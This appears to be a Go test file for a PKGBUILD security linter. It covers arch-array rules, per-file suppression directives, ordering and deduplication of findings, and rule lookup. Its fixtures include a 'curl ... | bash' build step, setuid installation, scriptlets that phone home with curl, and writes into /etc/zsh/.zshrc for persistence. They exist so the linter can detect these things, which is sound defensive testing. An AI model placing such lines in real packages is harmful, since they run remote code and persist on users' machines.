		expectNoRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'aarch64')\n"})
	})
	// `arch=()` followed by appends is how a PKGBUILD builds the list up one
	// architecture at a time. bash appends; only the literal is empty.
	t.Run("PB710 an array filled by appends is not empty", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\narch+=('x86_64')\narch+=('aarch64')\n",
		})
	})
	t.Run("PB710 an array left empty is still flagged", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\n"})
	})
	// Appended values are validated like any other, even though the merge kept
	// no source text for them.
	t.Run("PB710 an appended value is still validated", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64')\narch+=('x86-64')\n",
		})
	})
	// makepkg sources the whole file before reading metadata, so a branch that
	// sets arch has set it; which branch runs is not statically knowable.
	t.Run("PB710 arch set in a top-level conditional is set", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n" +
				"if [[ $CARCH == x86_64 ]]; then\n  arch=('x86_64')\nelse\n  arch=('any')\nfi\n",
		})
	})
	t.Run("PB710 an emptied array a conditional refills is not empty", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\n" +
				"if [[ -n $SOMETHING ]]; then\n  arch+=('x86_64')\nfi\n",
		})
	})
	// A function body runs long after makepkg has read the metadata, so an
	// assignment there does not count as setting the field.
	t.Run("PB710 arch set only in a build function is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\nbuild() {\n  arch=('x86_64')\n}\n",
		})
	})
	// A subshell's assignment dies with the subshell; makepkg's own shell
	// never sees it, so it does not count as setting the field.
	t.Run("PB710 arch set only in a subshell is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n( arch=('x86_64') )\n",
		})
	})
	// `arch=x86_64 true` scopes the assignment to that one command.
	t.Run("PB710 arch as a command's env prefix is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\nif [[ -n $X ]]; then\n  arch=x86_64 true\nfi\n",
		})
	})
}

func TestSuppression(t *testing.T) {
	files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  # pkglint: ignore=PB204
  go build -o demo .
}`)}
	expectNoRule(t, "PB204", files)
}

// findingLine returns the line of the first finding for id, failing the test if
// the fixture no longer trips the rule.
func findingLine(t *testing.T, id string, files map[string]string) int {
	t.Helper()
	fs := lint(t, files)
	for _, f := range fs {
		if f.RuleID == id {
			return f.Line
		}
	}
	t.Fatalf("fixture no longer trips %s: %v", id, ruleIDs(fs))
	return 0
}

// directiveOnLine returns src with "# pkglint: ignore=<id>" inserted so it
// occupies 1-based line n, padding with blank lines when src is shorter.
func directiveOnLine(src, id string, n int) string {
	lines := strings.Split(src, "\n")
	for len(lines) < n-1 {
		lines = append(lines, "")
	}
	out := append([]string{}, lines[:n-1]...)
	out = append(out, "# pkglint: ignore="+id)
	return strings.Join(append(out, lines[n-1:]...), "\n")
}

// TestSuppressionIsPerFile pins that an inline directive only waives findings
// in the file it appears in. Line numbers collide constantly between a PKGBUILD
// and its scriptlets, so a directive matched across files would hide findings
// its author never waived — and would let a benign-looking comment in one file
// silence a finding in another.
func TestSuppressionIsPerFile(t *testing.T) {
	const cleanScriptlet = "post_install() {\n  echo hi\n}\n"
	const netScriptlet = "post_install() {\n  curl -s https://example.com/track\n}\n"
	base := pkgbuildWith("", "install=demo.install")

	t.Run("scriptlet directive does not suppress a PKGBUILD finding", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install\nbuild() {\n  go build -o demo .\n}"),
			// demo.install must parse, so keep a real body under the directive.
			"demo.install": cleanScriptlet,
		}
		n := findingLine(t, "PB204", files)
		files["demo.install"] = strings.Repeat("\n", n-1) + "# pkglint: ignore=PB204\n" + cleanScriptlet
		expectRule(t, "PB204", files)
	})

	t.Run("PKGBUILD directive suppresses its own finding", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{
			"PKGBUILD": pkgbuildWith("", "build() {\n  go build -o demo . # pkglint: ignore=PB204\n}"),
		})
	})

	t.Run("scriptlet directive suppresses its own finding", func(t *testing.T) {
		expectNoRule(t, "PB501", map[string]string{
			"PKGBUILD":     base,
			"demo.install": "post_install() {\n  # pkglint: ignore=PB501\n  curl -s https://example.com/track\n}\n",
		})
	})

	t.Run("PKGBUILD directive does not suppress a scriptlet finding", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": base, "demo.install": netScriptlet}
		n := findingLine(t, "PB501", files)
		files["PKGBUILD"] = directiveOnLine(base, "PB501", n)
		expectRule(t, "PB501", files)
	})

	t.Run("scriptlet directive suppresses its own PB503", func(t *testing.T) {
		// An `if` with no then/fi: the scriptlet cannot be parsed, so its
		// directives must still be collected for PB503 (reported at line 1).
		const broken = "post_install() {\n  if [ -z ]\n}\n"
		expectRule(t, "PB503", map[string]string{"PKGBUILD": base, "demo.install": broken})
		expectNoRule(t, "PB503", map[string]string{
			"PKGBUILD":     base,
			"demo.install": "# pkglint: ignore=PB503\n" + broken,
		})
	})
}

func TestIgnoreFlag(t *testing.T) {
	dir := t.TempDir()
	content := pkgbuildWith("", `
build() {
  go build -o demo .
}`)
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if ids := ruleIDs(Run(pkg, map[string]bool{"PB204": true})); ids["PB204"] != 0 {
		t.Errorf("ignored rule still reported: %v", ids)
	}
}

// tiedFindingsPKGBUILD packs several findings onto the same position: line 7
// col 1 alone carries two PB101s (one per unchecksummed source) plus PB103,
// PB104 and PB105. Those tie on (Path, Line, RuleID) or (Path, Line), so they
// are exactly what an incomplete comparator leaves to the unstable sort.
const tiedFindingsPKGBUILD = `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='http://example.com/demo'
license=('MIT')
source=("https://example.com/a-$pkgver.tar.gz" "git+https://github.com/example/demo.git" "http://example.com/b.tar.gz")
sha256sums=('SKIP' 'SKIP' 'SKIP')

build() {
  curl -s https://example.com/x | bash
}

package() {
  install -Dm4755 demo "$pkgdir/usr/bin/demo"
}
`

// TestFindingsAreDeterministic is the flakiness proof for Run's ordering.
// Several upstream steps range over maps (NewContext over pkg.Vars, Sources()
// over its own map), so findings reach the sort in a random order; only a total
// comparator makes the output reproducible. Loading inside the loop keeps that
// randomness in play while holding Path fixed.
func TestFindingsAreDeterministic(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"PKGBUILD": tiedFindingsPKGBUILD,
		"demo.install": `post_install() {
  cp /tmp/x /etc/zsh/.zshrc
  echo hi >> /etc/zsh/.zshrc
}`,
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	var first []Finding
	for i := 0; i < 50; i++ {
		pkg, err := pkgbuild.Load(dir)
		if err != nil {
			t.Fatalf("load: %v", err)
		}
		got := Run(pkg, nil)
		if i == 0 {
			first = got
			if len(first) < 5 {
				t.Fatalf("fixture should tie several findings, got %d: %+v", len(first), first)
			}
			continue
		}
		if !reflect.DeepEqual(got, first) {
			t.Fatalf("run %d differs from run 0\n--- got ---\n%+v\n--- want ---\n%+v", i, got, first)
		}
	}

	// Reproducibility across runs only proves the input order happened not to
	// vary; assert the ordering itself is total, so no pair is left for an
	// unstable sort to decide.
	for i := 1; i < len(first); i++ {
		if !less(first[i-1], first[i]) {
			t.Errorf("findings %d and %d are not in strict (Path, Line, Col, RuleID, Message) order:\n%+v\n%+v",
				i-1, i, first[i-1], first[i])
		}
	}
}

// less reports whether a sorts strictly before b under the total order Run
// promises. Independent of Run's own comparator on purpose.
func less(a, b Finding) bool {
	if a.Path != b.Path {
		return a.Path < b.Path
	}
	if a.Line != b.Line {
		return a.Line < b.Line
	}
	if a.Col != b.Col {
		return a.Col < b.Col
	}
	if a.RuleID != b.RuleID {
		return a.RuleID < b.RuleID
	}
	return a.Message < b.Message
}

// TestDuplicateFindingsAreDropped covers overlapping persistencePathHints:
// "/etc/zsh/.zshrc" matches both "/etc/zsh" and ".zshrc", which used to report
// the identical PB502 twice per construct.
func TestDuplicateFindingsAreDropped(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("command argument", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  cp /tmp/x /etc/zsh/.zshrc
}`,
		}))
		if ids["PB502"] != 1 {
			t.Errorf("expected exactly one PB502, got %d: %v", ids["PB502"], ids)
		}
	})
	t.Run("redirect target", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  echo hi >> /etc/zsh/.zshrc
}`,
		}))
		if ids["PB502"] != 1 {
			t.Errorf("expected exactly one PB502, got %d: %v", ids["PB502"], ids)
		}
	})
}

// TestDistinctFindingsAtOneLocationSurvive guards the dedup key from being too
// loose: findings that share a position but differ in rule ID or message are
// distinct reports and must all survive.
func TestDistinctFindingsAtOneLocationSurvive(t *testing.T) {
	findings := lint(t, map[string]string{"PKGBUILD": tiedFindingsPKGBUILD})
	ids := ruleIDs(findings)

	// Same rule, same position, different message: one PB101 per unchecksummed
	// source on the shared source= line.
	if ids["PB101"] != 2 {
		t.Errorf("expected 2 PB101 (one per skipped source), got %d: %v", ids["PB101"], ids)
	}
	// Different rules at the same position must all be kept.
	for _, id := range []string{"PB103", "PB104", "PB105"} {
		if ids[id] != 1 {
			t.Errorf("expected 1 %s, got %d: %v", id, ids[id], ids)
		}
	}

	// Nothing at all should be lost to dedup: every finding is unique on the
	// full key.
	type key struct {
		rule, msg, path string
		line, col       int
	}
	seen := map[key]bool{}
	for _, f := range findings {
		k := key{f.RuleID, f.Message, f.Path, f.Line, f.Col}
		if seen[k] {
			t.Errorf("duplicate finding survived dedup: %+v", f)
		}
		seen[k] = true
	}
}

// TestSplitPackageVarRendering pins how $pkgname resolves in a split package:
// bash expands the bare array reference to its first element everywhere,
// except inside package_<name>() where makepkg rebinds pkgname to that split.
func TestSplitPackageVarRendering(t *testing.T) {
	dir := t.TempDir()
	content := `pkgbase=demo
pkgname=(demo demo-docs)
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
  touch $pkgname.built
}

package_demo() {
  install -Dm644 ${pkgname}.service "$pkgdir/usr/lib/systemd/system/${pkgname}.service"
}

package_demo-docs() {
  install -Dm644 COPYING -t "$pkgdir/usr/share/licenses/${pkgname}/"
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	ctx := NewContext(pkg)

	argsIn := func(fn string) []string {
		t.Helper()
		for _, c := range ctx.Commands() {
			if c.Fn == fn {
				return c.Args
			}
		}
		t.Fatalf("no command found in %s()", fn)
		return nil
	}

	if args := argsIn("build"); len(args) != 1 || args[0] != "demo.built" {
		t.Errorf("build(): $pkgname should render as the array's first element, got %v", args)
	}
	if args := argsIn("package_demo"); len(args) < 3 || args[1] != "demo.service" {
		t.Errorf("package_demo(): ${pkgname}.service should render as demo.service, got %v", args)
	}
	if args := argsIn("package_demo-docs"); len(args) < 4 || args[3] != "$pkgdir/usr/share/licenses/demo-docs/" {
		t.Errorf("package_demo-docs(): pkgname should rebind to the split's own name, got %v", args)
	}
}

// TestLookup covers the spellings `pkglint explain` accepts for a rule: the ID
// in any case, and the rule's short name.
func TestLookup(t *testing.T) {
	for _, q := range []string{"PB101", "pb101", "  PB101  ", "skipped-checksum", "Skipped-Checksum"} {
		r, ok := Lookup(q)
		if !ok {
			t.Errorf("Lookup(%q) found nothing", q)
			continue
		}
		if r.ID != "PB101" {
			t.Errorf("Lookup(%q) = %s, want PB101", q, r.ID)
		}
	}
	for _, q := range []string{"", "PB9999", "checksum", "PB10 1"} {
		if _, ok := Lookup(q); ok {
			t.Errorf("Lookup(%q) resolved, want no match", q)
		}
	}
	// Every rule has to be reachable by both of its own spellings, or the
	// listing sends people to a page `explain` cannot open.
	for _, want := range Registry() {
		for _, q := range []string{want.ID, want.Name} {
			if got, ok := Lookup(q); !ok || got.ID != want.ID {
				t.Errorf("Lookup(%q) = %s (found=%v), want %s", q, got.ID, ok, want.ID)
			}
		}
	}
}

// TestSuggest covers the near matches an unresolvable argument offers: an ID
// the query prefixes, a name it appears in, and nothing at all for a query
// that resembles neither.
func TestSuggest(t *testing.T) {
	ids := func(rs []Rule) []string {
		var out []string
		for _, r := range rs {
			out = append(out, r.ID)
		}
		return out
	}
	if got := ids(Suggest("checksum")); !slices.Contains(got, "PB101") || !slices.Contains(got, "PB102") {
		t.Errorf("Suggest(\"checksum\") = %v, want the checksum rules", got)
	}
	if got := ids(Suggest("pb10")); len(got) == 0 || got[0] != "PB101" {
		t.Errorf("Suggest(\"pb10\") = %v, want PB101 first", got)
	}
	if got := Suggest("pb"); len(got) != suggestLimit {
		t.Errorf("Suggest(\"pb\") returned %d rules, want the cap of %d", len(got), suggestLimit)
	}
	for _, q := range []string{"", "  ", "zzzzz"} {
		if got := Suggest(q); len(got) != 0 {
			t.Errorf("Suggest(%q) = %v, want nothing", q, ids(got))
		}
	}
}
